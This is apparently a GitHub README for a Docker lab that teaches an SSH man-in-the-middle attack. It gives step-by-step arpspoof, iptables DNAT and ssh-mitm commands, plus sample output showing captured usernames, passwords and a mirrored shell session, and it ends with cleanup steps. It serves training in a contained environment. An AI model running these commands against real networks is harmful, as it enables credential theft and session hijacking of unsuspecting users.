
# SSH MITM Attack Lab

## OFFICIAL DOCUMENATION IS AT [www.rootandbeer.com/labs/ssh-mitm](https://www.rootandbeer.com/labs/ssh-mitm). Please visit the website for the most up-to-date documentation on this lab.

## Introduction

| Repo |⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-mitm) if you enjoyed this lab ⭐ |
| --- | --- |
| Downloads | [![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/rootandbeer/YOUR_GIST_ID/raw/clone.json&logo=github)](https://github.com/MShawon/github-clone-count-badge) |
| Stars | [![GitHub stars](https://badgen.net/github/stars/rootandbeer/ssh-mitm)](https://GitHub.com/rootandbeer/ssh-mitm/stargazers/) |
| Prerequisites | [Docker](https://docs.docker.com/engine/install/), [SSH-MITM](https://github.com/ssh-mitm/ssh-mitm), [arpspoof](https://www.kali.org/tools/dsniff/) |
| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |

This lab demonstrates how to perform a Man-in-the-Middle (MITM) attack on SSH connections using ARP spoofing and SSH-MITM. You will learn to intercept SSH traffic between a client and server, redirecting it through a proxy to capture credentials and monitor sessions in real-time. The lab uses Docker containers to create a controlled network environment for ethical security testing.

---

## Lab Environment

| Description | Hostname | IP Address | USERNAME:PASSWORD |
|---|---|---|---|
| Gateway | | 172.25.0.1 | | 
| SSH Server (Target) | ssh-server | 172.25.0.10 | admin:P@assw0rd123 |
| Victim Client | victim-client | 172.25.0.20 | targetuser:supersecret |

---


## Setup

Clone the repository:

```shell
git clone http://www.github.com/rootandbeer/ssh-mitm
cd ssh-mitm
```

\
Start the target environment:

```shell
docker-compose up -d
# Wait for services to initialize
```

---

## Network Configuration

>[!warning] Most networks will use `eth0` (use `ifconfig` to verify in real world applications), however since this lab is done in Docker, we have to find the specific Docker bridge interface.

Identify the Docker bridge interface:

```shell
# Find Docker bridge interface
export BRIDGE="br-$(sudo docker network ls | awk '/mitm_network/ {print $1}')"

echo "Bridge: $BRIDGE"
```

---

## Configure IP Forwards & NAT Redirects

Enable IP forwarding:

```shell
sudo sysctl -w net.ipv4.ip_forward=1
```

\
Verify the change:

```shell
cat /proc/sys/net/ipv4/ip_forward  # Should show: 1
```

\
Redirect SSH traffic to the ssh-mitm proxy:

```shell
sudo iptables -t nat -A PREROUTING -i "$BRIDGE" -p tcp -d 172.25.0.10 --dport 22 -j DNAT --to-destination 172.25.0.1:22
```

\
Verify the iptables rule was added:

```shell
sudo iptables -t nat -L PREROUTING -n -v
```

## Attack Execution

>[!danger] This attack simulation uses 3 terminals

>[!note] Terminal 1 - Start the SSH MITM proxy
>
>Basic configuration:
>
>```shell
>sudo ssh-mitm server \
>    --remote-host 172.25.0.10 \
>    --listen-port 22 \
>    --listen-address 172.25.0.1
>```
>
>\
>Verify ssh-mitm is listening:
>
>```shell
>sudo netstat -tlnp | grep :22
># Should show ssh-mitm listening on 172.25.0.1:22
>```

>[!important] Terminal 2 - Start ARP spoofing:
>
>Keep this terminal running continuously throughout the attack
>
>```shell
>sudo arpspoof -i $BRIDGE -t 172.25.0.20 172.25.0.10
>```


>[!warning] Terminal 3 - Simulate victim SSH connection
>
>Access the victim container:
>
>```shell
>docker exec -it victim-client bash
>```
>
>\
>From inside the container, connect to the SSH server:
>
>```shell
>ssh targetuser@172.25.0.10
># When prompted, enter password: supersecret
>```

### Monitor Captured Credentials

**Watch Terminal 1** (ssh-mitm output) for captured credentials:

```bash
[01/03/26 15:14:14] INFO     Remote authentication succeeded   
                                     Remote Address: 172.25.0.10:22          
                                     Username: targetuser                    
                                     Password: supersecret                   
                                     Agent: no agent                         
                    INFO     ℹ                                               
                             265e4691-d19b-4826-a32c-4b140920a30c
                             [0m - local port forwarding                     
                             SOCKS port: 39407          
                               SOCKS4:                                 
                                 * socat: socat                  
                             TCP-LISTEN:LISTEN_PORT,fork                     
                             socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=39407                           
                                 * netcat: nc -X 4 -x            
                             localhost:39407 address port                    
                               SOCKS5:                                 
                                 * netcat: nc -X 5 -x            
                             localhost:39407 address port                    
[01/03/26 15:14:15] INFO     ℹ                                               
                             265e4691-d19b-4826-a32c-4b140920a30c
                             [0m - session started                           
                    INFO     ℹ created mirrorshell on port 38099. connect    
                             with: ssh -p 38099 127.0.0.1  
```

---

## Optional: Packet Capture

**Terminal 4 - Capture traffic for analysis:**

Start capturing SSH traffic:

```shell
sudo tcpdump -i $BRIDGE -w /tmp/ssh-mitm.pcap "host 172.25.0.20 and port 22"
```

\
Analyze the captured packets:

```shell
# View packet contents in ASCII
tcpdump -r /tmp/ssh-mitm.pcap -A

# Open in Wireshark for detailed analysis
wireshark /tmp/ssh-mitm.pcap
```

---

## Cleanup

### Remove iptables Rules

Remove the specific PREROUTING rule:

```shell
sudo iptables -t nat -D PREROUTING -i "$BRIDGE" -p tcp -d 172.25.0.10 --dport 22 -j DNAT --to-destination 172.25.0.1:22
```

\
Alternatively, flush all NAT rules (use with caution):

```shell
sudo iptables -t nat -F
```

### Restore Environment

Disable IP forwarding:

```shell
sudo sysctl -w net.ipv4.ip_forward=0
```

\
Stop and remove the Docker containers:

```shell
docker-compose down
```

---

\
⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-mitm) if you enjoyed this lab ⭐